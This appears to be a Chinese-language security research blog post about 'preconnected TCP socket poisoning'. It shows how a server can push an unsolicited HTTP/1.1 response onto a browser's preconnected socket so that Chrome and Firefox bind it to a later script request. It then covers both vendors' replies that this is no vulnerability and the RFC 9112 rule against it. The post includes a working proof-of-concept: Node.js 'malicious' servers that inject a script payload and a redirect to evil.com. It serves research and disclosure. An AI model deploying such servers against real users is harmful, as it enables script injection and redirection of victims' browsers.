---
title: "Preconnected TCP socket Poisoning: Chrome / Firefox、HTTP/1.1 與 Security 邊界分析"
description: 分析瀏覽器對 preconnected HTTP/1.1 TCP socket 的 request / response binding 行為，並整理 Chrome、Firefox 為何不將其視為 security issue
last_update:
  date: "2025-04-17T08:00:00+08:00"
---

## 先備知識

- [HTTP/1.1 Message](./anatomy-of-an-http-message.md)
  ![HTTP/1.1-Message](../../static/img/HTTP-1.1-Message.svg)
- [HTTP/1.1 Keep-Alive, Connection](./keep-alive-and-connection.md)
  ![HTTP/1.1-Keep-Alive-Connection](../../static/img/HTTP-1.1-Keep-Alive-Connection.svg)

## 前言

在 HTTP/1.1 的世界，client 在一條 TCP connection 發送多個 HTTP request，server 會依照 client 發送的順序來依序回應

用 Node.js 架個 `http.Server` 驗證看看

```js
import http from "http";

const server = http.createServer((req, res) => res.end(req.url));
server.listen(5000);
```

依序發送三個 HTTP request

1. `GET /request1 HTTP/1.1\r\nHost: 127.0.0.1:5000\r\n\r\n`
2. `GET /request2 HTTP/1.1\r\nHost: 127.0.0.1:5000\r\n\r\n`
3. `GET /request3 HTTP/1.1\r\nHost: 127.0.0.1:5000\r\n\r\n`

用 [Wireshark](https://www.wireshark.org/download.html) 抓包，可以清楚地看到 request / response 一來一往的順序
![3-requests-wireshark](../../static/img/3-requests-wireshark.jpg)

可以畫成以下時序圖

```mermaid
sequenceDiagram
  participant c as client
  participant s as server

  Note Over c,s: TCP 3-way handshake

  Note Over c,s: 1st HTTP round trip
  c ->> s: GET /request1 HTTP/1.1<br/>Host: 127.0.0.1:5000
  s ->> c: HTTP/1.1 200 OK<br/>Connection: keep-alive<br/>Keep-Alive: timeout=5<br/>Content-Length: 9<br/><br/>/request1

  Note Over c,s: 2nd HTTP round trip
  c ->> s: GET /request2 HTTP/1.1<br/>Host: 127.0.0.1:5000
  s ->> c: HTTP/1.1 200 OK<br/>Connection: keep-alive<br/>Keep-Alive: timeout=5<br/>Content-Length: 9<br/><br/>/request2

  Note Over c,s: 3rd HTTP round trip
  c ->> s: GET /request3 HTTP/1.1<br/>Host: 127.0.0.1:5000
  s ->> c: HTTP/1.1 200 OK<br/>Connection: keep-alive<br/>Keep-Alive: timeout=5<br/>Content-Length: 9<br/><br/>/request3
```

但以上的前提是 "client 跟 server 都遵守規範"！

**如果 server 在第一包 HTTP request 送出以前，就 "偷塞" 了一包 HTTP response，那 request / response 的 binding 會亂掉嗎？**

## "Response Misbinding" 圖解

我想測試的情境如下：

```mermaid
sequenceDiagram
  participant c as client
  participant s as server

  Note Over c,s: TCP 3-way handshake

  Note Over s: Poison the TCP socket by sending<br/>a complete "poisoned" HTTP response
  s ->> c: HTTP/1.1 302 Found<br/>Location: http://evil.com<br/>Content-Length: 0
  c ->> s: GET /request1 HTTP/1.1<br/>Host: 127.0.0.1:5000

  Note Over c: Will client treat the "poisoned" HTTP response<br/>as the response of /request1 ?
```

## 現實難點

正常情況下，client 跟 server 進行 TCP 3-way handshake 之後，client 馬上就會發送第一包 HTTP request，server 很難搶在第一包 HTTP request 送出之前，就把 "poisoned" HTTP response 提前送出

由於我主線研究是 Node.js，所以用 Node.js 來寫 PoC 也很正常，但缺點是 `net` 或是 `http` 模組暴露的 API 太高階了，我很難精準的控制 "poisoned" HTTP response 在 TCP 3-way handshake 之後立即送出

使用 `net` 來建立 HTTP server，並且嘗試在 TCP connection 建立後，立即塞入 "poisoned" HTTP response

```js
import net from "net";

const response =
  "HTTP/1.1 302 Found\r\nLocation: http://evil.com\r\nContent-Length: 0\r\n\r\n";
const server = net.createServer();
server.listen(5000);
server.on("connection", (socket) => socket.write(response));
```

使用多個 HTTP client（curl, python requests, php cURL）發送 HTTP request，發現 "poisoned" HTTP response 根本跑不贏第一包 HTTP request，最終都會落到正常的 request / response 順序

```mermaid
sequenceDiagram
  participant c as client
  participant s as server

  Note Over c,s: TCP 3-way handshake

  c ->> s: GET /request1 HTTP/1.1<br/>Host: 127.0.0.1:5000
  s ->> c: HTTP/1.1 302 Found<br/>Location: http://evil.com<br/>Content-Length: 0
```

如果要達成我的目標

1. 第一包 HTTP request 要盡可能地晚一點送（但又必須符合正常 HTTP client 的行為）
2. "poisoned" HTTP response 要盡可能地早一點送（有想過寫個 C 語言來達到比較精準的 TCP Bytes 控制，但感覺這條路的 attack complexity 很高，因為 race-window 很短）

## 轉機

我詢問了 AI
![ask-ai-client-preconnect](../../static/img/ask-ai-client-preconnect.jpg)

AI 的回覆讓我有了新的想法
![ask-ai-client-preconnect-response](../../static/img/ask-ai-client-preconnect-response.jpg)

看到 "preconnect" 這個單字，讓我立即想到瀏覽器的

```html
<link rel="preconnect" href="https://fonts.gstatic.com" />
```

可以用來預先建立 TCP 連線（若 https 的話則是 TCP + TLS）

## 時序圖

測試情境如下：

1. 使用者用瀏覽器訪問一個正常網站 `http://127.0.0.1:5000`
2. 該網站的 HTML 含有 `<link rel="preconnect" href="http://127.0.0.1:5001" />`
3. 瀏覽器跟 `127.0.0.1:5001` 建立 TCP 連線後，`127.0.0.1:5001` 立即偷塞一包 "poisoned" HTTP response 給瀏覽器
4. 該網站的 HTML 後續載入 `http://127.0.0.1:5001/script1.js`，**response 會不會吃到 "poisoned" 那包**？

```mermaid
sequenceDiagram
  participant b as browser
  participant s1 as html server<br/>(127.0.0.1:5000)
  participant s2 as malicious server<br/>(127.0.0.1:5001)


  b ->> s1: GET / HTTP/1.1<br/>Host: 127.0.0.1:5000
  s1 ->> b: HTTP/1.1 200 OK<br/>Content-Type: text/html<br/>Content-Length: ...<br/><br/>HTML Content...

  Note Over b, s2: browser preconnect to malicious server

  Note Over s2: Poison the TCP socket by sending<br/>a complete "poisoned" HTTP response
  s2 ->> b: HTTP/1.1 200 OK<br/>Content-Length: 15<br/><br/>alert('poison')
  b ->> s2: GET /script1.js HTTP/1.1<br/>Host: 127.0.0.1:5001

  Note Over b: Will browser treat the "poisoned" HTTP response<br/>as the response of /script1.js ?
```

## PoC

1. 創建 `index.html`

```html
<head>
  <!-- Ask the browser to establish a TCP connection to 127.0.0.1:5001 early.
      This does not guarantee reuse, but it increases the chance that
      the later requests will use the same connection. -->
  <link rel="preconnect" href="http://127.0.0.1:5001/" />
</head>
<body>
  <script>
    // Use "setTimeout" to ensure the "preconnected" TCP connection is reused.
    // In a real page, HTML parsing/rendering can naturally delay when the
    // <script> element at the end of <body> is appended or fetched.
    // For this minimal PoC, "setTimeout" is used to make the timing explicit.
    setTimeout(() => {
      const script1 = document.createElement("script");
      script1.src = "http://127.0.0.1:5001/script1.js";
      document.body.appendChild(script1);
    }, 1000);
  </script>
</body>
```

2. 創建 `http_server.cjs`（在 `127.0.0.1:5000` 啟一個 `http.Server`，用來 serve 這個靜態 html）

```js
const { readFileSync } = require("fs");
const http = require("http");
const { join } = require("path");

const normalHtmlServer = http.createServer((req, res) => {
  if (req.url === "/") {
    res.end(readFileSync(join(__dirname, "index.html")));
    return;
  }
  return res.end();
});
normalHtmlServer.listen(5000, () => console.log("listening on port 5000"));
```

3. 創建 `malicious_server.cjs`（在 `127.0.0.1:5001` 啟一個 malicious `http.Server`）

```js
const http = require("http");

const maliciousServer = http.createServer((req, res) => {
  if (req.url === "/script1.js") return res.end("alert('script1')");
  return res.end();
});
maliciousServer.on("connection", (socket) => {
  // Poison the preconnected TCP socket by sending a complete HTTP response
  // before the first HTTP request is received.
  socket.write("HTTP/1.1 200 OK\r\nContent-Length: 15\r\n\r\nalert('poison')");
});
maliciousServer.listen(5001, () => console.log("listening on port 5001"));
```

4. 用瀏覽器打開 http://127.0.0.1:5000/ ，看到彈出視窗 "poison"
   ![alert-poison](../../static/img/alert-poison.jpg)
5. 用 wireshark 抓包，確認 "poisoned" HTTP response 確實早於 `GET /script1.js HTTP/1.1`
   ![poison-before](../../static/img/poison-before.jpg)

## 操作影片

我將這個案例回報給 Chrome 跟 Firefox，並且附上了操作影片

- [poc-demo-chrome](../../static/img/poc-demo-chrome.mov)
- [poc-demo-firefox](../../static/img/poc-demo-firefox.mp4)

## 收到回覆

在 1 個工作天以內，我就收到了 Chrome 跟 Firefox 的回應，兩者皆認為這不是 security vulnerability

Chrome 回覆說：

```
I don't see any security consequences because I don't know how an attacker would inject data into the preconnected socket. Please open a new bug with a clear explanation of the threat model if you believe this is a security bug. Thank you.
```

![chrome-feedback](../../static/img/chrome-feedback.jpg)

Firefox 回覆說：

```
While perhaps we could block aggressively-sent data on an Http1 connection, this is no different in practice than a server that waits for a GET and then sends the same data; it just gets to us a bit faster. We could consider it a protocol error for data to be sent before we send the GET, but it doesn't matter in practice, and sniffing connections for 'early' data a) would have a small cost, in time/cpu and complexity, and b) is inherently racy -- if we sniff it for data, find none, and then send GET - data could come in between sniffing and GET.

This is not a spec violation, and it's not a security issue.
```

![firefox-feedback](../../static/img/firefox-feedback.jpg)

我認為 Firefox 的回覆比較專業，因為回覆的人有理解整個 PoC 的核心概念，並且也提出了這個 race condition 在實務上的判斷難點

- data could come in between sniffing and GET

不過最後一句話，激起了我的好奇心

- This is not a spec violation

## RFC 9112 9.2. Associating a Response to a Request

RFC 9112 是 HTTP/1.1 的正式規範，我直接引用整段原文

```
HTTP/1.1 does not include a request identifier for associating a given request message with its corresponding one or more response messages. Hence, it relies on the order of response arrival to correspond exactly to the order in which requests are made on the same connection. More than one response message per request only occurs when one or more informational responses (1xx; see Section 15.2 of [HTTP]) precede a final response to the same request.

A client that has more than one outstanding request on a connection MUST maintain a list of outstanding requests in the order sent and MUST associate each received response message on that connection to the first outstanding request that has not yet received a final (non-1xx) response.

If a client receives data on a connection that doesn't have outstanding requests, the client MUST NOT consider that data to be a valid response; the client SHOULD close the connection, since message delimitation is now ambiguous, unless the data consists only of one or more CRLF (which can be discarded per Section 2.2).
```

依我的解讀，若當下 connection 上尚無 outstanding request，browser 不應將這包 "poisoned" HTTP response 視為後續第一個 request（GET /script1.js）的有效 response。

```
If a client receives data on a connection that doesn't have outstanding requests, the client MUST NOT consider that data to be a valid response
```

## 小結

實務上，違反規範 **不一定等於** 資安漏洞。這個案例也讓我開始思考：

- HTTP client 的 finding 要被視為 vulnerability，通常不能只靠 spec violation
- 真正關鍵的是：attacker 能否因為這個 BUG **獲得新的能力**

這題讓我更在意的是：**HTTP client 的實作是否在 edge case 下仍維持明確的 request / response association**

雖然 vendor 不把它當 security issue，不代表這題沒有研究價值，它仍然是一個很好的案例：

去觀察 browser 如何在真實 optimization（preconnect）情況下，處理不尋常的 edge case
